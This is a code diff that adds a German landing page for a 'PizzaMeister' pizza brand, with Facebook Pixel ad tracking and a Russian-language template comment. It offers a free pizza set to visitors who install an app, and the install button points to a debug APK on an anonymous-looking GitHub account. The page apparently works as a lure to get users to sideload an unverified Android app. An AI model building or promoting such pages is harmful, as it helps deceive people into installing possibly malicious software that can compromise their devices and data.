@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="de-DE">
+<!-- Facebook Pixel Code -->
+<script>
+    !function (f, b, e, v, n, t, s) {
+        if (f.fbq) return; n = f.fbq = function () {
+            n.callMethod ?
+            n.callMethod.apply(n, arguments) : n.queue.push(arguments)
+        };
+        if (!f._fbq) f._fbq = n; n.push = n; n.loaded = !0; n.version = '2.0';
+        n.queue = []; t = b.createElement(e); t.async = !0;
+        t.src = v; s = b.getElementsByTagName(e)[0];
+        s.parentNode.insertBefore(t, s)
+    }(window, document, 'script',
+        'https://connect.facebook.net/en_US/fbevents.js');
+    fbq('init', '943390024328493'); // <-- твой Pixel ID
+    fbq('track', 'PageView');
+</script>
+<noscript>
+    <img height="1" width="1" style="display:none"
+        src="https://www.facebook.com/tr?id=943390024328493&ev=PageView&noscript=1" />
+</noscript>
+<!-- End Facebook Pixel Code -->
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>App installieren & kostenloses Set sichern</title>
+    <link rel="stylesheet" href="./css/styles.css">
+</head>
+
+<body>
+    <header class="header" id="header">
+        <nav class="nav container" aria-label="Hauptnavigation">
+            <a href="#" class="nav__logo" aria-label="Zur Startseite">
+                <img src="img/logo.png" alt="PizzaMeister Logo"> PizzaMeister
+            </a>
+            <div class="nav__buttons">
+                <a href="index.html" class="nav__link nav__lang-btn" id="langToggle">EN</a>
+            </div>
+        </nav>
+    </header>
+
+    <section class="home section" id="home">
+        <div class="home__container container grid">
+            <img src="img/home-pizza.png" alt="home image" class="home__img">
+            <div class="home__data">
+                <h1 class="home__title">
+                    App installieren<br>& kostenloses Set sichern
+                </h1>
+                <p class="home__description">
+                    Laden Sie die PizzaMeister App herunter und sichern Sie sich jetzt Ihr kostenloses Pizza-Set.
+                </p>
+                <a href="https://github.com/dabzyjjvX3597/download-apk/releases/download/v1.0/app-debug.apk"
+                    class="button order-now-btn" onclick="fbq('track', 'Lead')">
+                    App installieren
+                </a>
+
+            </div>
+        </div>
+    </section>
+    <footer class="footer">
+        <div class="footer__copy container">
+            <a href="/" class="footer__logo" aria-label="Zur Startseite">
+                <img src="img/logo.png" alt="PizzaMeister Logo"> PizzaMeister
+            </a>
+            © 2025 PizzaMeister. Alle Rechte vorbehalten.
+        </div>
+    </footer>
+</body>
+
+</html>
